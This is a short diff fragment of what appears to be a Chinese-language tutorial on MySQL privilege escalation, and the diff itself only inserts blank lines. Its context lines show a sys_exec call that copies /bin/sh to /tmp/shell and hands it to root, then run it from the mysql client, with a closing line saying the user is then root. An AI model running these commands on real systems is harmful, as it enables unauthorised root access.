@@ -36,5 +36,7 @@ select sys_exec('cp /bin/sh /tmp/shell;chown root /tmp/shell;chgrp root /tmp/she
 \! /tmp/shell
 ```
 将/bin/sh移动到/tmp下并取名为shell，然后改变/tmp/shell的拥有者、所属的组、文件权限。
+
 \! /tmp/shell是在mysql下执行shell，\! 后面可以接其他的shell语句
+
 之后即为root用户
